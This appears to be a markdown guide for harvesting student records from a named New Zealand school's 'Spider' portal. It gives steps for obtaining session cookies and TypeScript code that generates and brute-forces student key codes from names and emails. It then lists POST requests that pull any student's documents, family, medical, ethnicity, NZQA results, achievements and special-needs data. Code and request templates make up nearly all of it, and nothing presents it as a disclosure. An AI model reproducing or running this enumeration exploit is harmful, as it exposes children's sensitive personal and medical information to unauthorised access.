# Gaining Authentication

## Using Seleium

At https://spider.scotscollege.school.nz/Spider2011/Pages/Login.aspx, login with valid details, copy following cookies:
`.ASPXAUTH`, `ASP.NET_SessionId`

This can be done using an automation library, see Seleium.

## Using POST

```
POST:
https://spider.scotscollege.school.nz/Spider2011/Handlers/Login.asmx/GetWebLogin
data: {
	UserName: <string>,
	Password: <string>,
	SecurityKey: ""
}

Response:
header.set-cookie
```

## To verify cookies:

```
POST: 
https://spider.scotscollege.school.nz/Spider2011/Handlers/Personalisation.asmx/GetPersonalisationFavouriteControl_ByMemberID
data: {
	"ControlID": "TIMETABLE",
    "PageName": "Curriculum/Timetable/SearchStudentTimeTable.aspx"
}
```

Cookies are ok if response code is 200 and does not contain "Authentication failed"


# Getting Keycode
Given: `barcode`, `email`, `first_name`, `middle_name`, `last_name`

Note, `barcode` is the 6 digit number on one's id card. Not all needed.

## Typescript Implementation
```typescript
function KeycodesGenerate(info: KeycodeSearchInfo): string[] {
	const { firstName, lastName, middleName, email } = info;

	let results: string[] = [];

	// test email
	if (email.length >= 3) {
		const l = email.length;
		const firstNames = [
			email.slice(0, l - 1),
			email.slice(0, l - 2),
			email.slice(0, l - 3),
		];

		const lastNames = [
			email[l - 1],
			email.slice(l - 2, l),
			email.slice(l - 3, l),
		];

		results = results.concat(firstNames.map((f, i) => `${f} ${lastNames[i]}`));

		results.push(email.slice(0, l - 2) + ' ' + email[l - 2] + email[l - 1]);
	}

	// test first name and last name
	if (firstName.length > 0 && lastName.length > 0) {
		for (let i = 0; i < 3; i++) {
			results.push(`${lastName} ${firstName.slice(0, i + 1)}`);
		}
		if (firstName.length >= 2) {
			results.push(`${lastName} ${firstName[0]} ${firstName[1]}`);
			results.push(`${lastName} ${firstName[0]}${firstName[1]}`);
		}
	}

	// test last name
	if (lastName.length > 0) {
		results.push(lastName);
	}

	// test middle name
	if (middleName.length > 0) {
		const split = middleName.split(' ');

		const l = results.length;
		for (let i = 0; i < l; i++) {
			results.push(`${results[i]} ${middleName[0]}`);
			if (split.length > 1) {
				results.push(`${results[i]} ${split[0][0]} ${split[0][1]}`);
			}
		}
	}

	// brute force
	const length = results.length;
	for (const c of "abcdefghijklmnopqrstuvwxyz") {
		for (let i = 0; i < length; i++) {
			results.push(`${results[i]}${c}`);
			results.push(`${results[i]} ${c}`);
		}
	}

	// remove dupe
	return [... new Set(results)];
}
```

To see if a keycode is valid:
```
POST:
https://spider.scotscollege.school.nz/Spider2011/Handlers/Student.asmx/GetStudent_ByStudentKey
data: {
    StudentKey: <string>
}

Response:
valid = res.d && res.d.StudentName != null
```

# Crawling Items
We have access to:
- documents
- family
- medical
- race
- nzqa
- achievements
- special

The details of these information are too long to describe here

Do the following in series

## Personal Information
```
POST: https://spider.scotscollege.school.nz/Spider2011/Handlers/Student.asmx/GetStudent_ByStudentKey
data: {
	StudentKey: <keycode: string>
}

Response:
barcode = res.d.Barcode
```

## Documents
```
POST:
https://spider.scotscollege.school.nz/Spider2011/Handlers/DocumentManager.asmx/GetDocumentFolders
data: {
	Key: <keycode: string>,
	OwnerType: "STUDENT",
	nUserID: <barcode: string>
}
```

## Family
```
POST: 
https://spider.scotscollege.school.nz/Spider2011/Handlers/Family.asmx/GetFamilyCaregivers_ByStudentKey_Member
data: {
	Studkey: <keycode: string>,
	ShowNonDomicile: true
}
```

## Medical
```
POST: 
https://spider.scotscollege.school.nz/Spider2011/Handlers/Medical.asmx/GetMedicalHistory_ByStudentID
data: {
	StudentID: <barcode: string>
}
```

## Race
```
POST: 
https://spider.scotscollege.school.nz/Spider2011/Handlers/Ethnicity.asmx/GetEthnicities_ByStudentID
data: {
	StudentID: <barcode: string>
}
```

## NZQA
```
POST: 
https://spider.scotscollege.school.nz/Spider2011/Handlers/NZAssessments.asmx/GetStudentNZQAResults
data: {
	studentID: <barcode: string>
}

Response:
keycode = res.d[0].StudKey
```

## Achievements
```
POST: 
https://spider.scotscollege.school.nz/Spider2011/Handlers/Curriculum/LiveData/Achievements.asmx/GetStudentAchievements
data: {
	studentID: <barcode: string>,
	analyticsCode: "ACH"
}
```

## Special
```
POST: 
https://spider.scotscollege.school.nz/Spider2011/Handlers/SpecialNeed.asmx/GetSpecialNeeds_ByStudentKey
data: {
	StudentKey: <keycode: string>
}
```

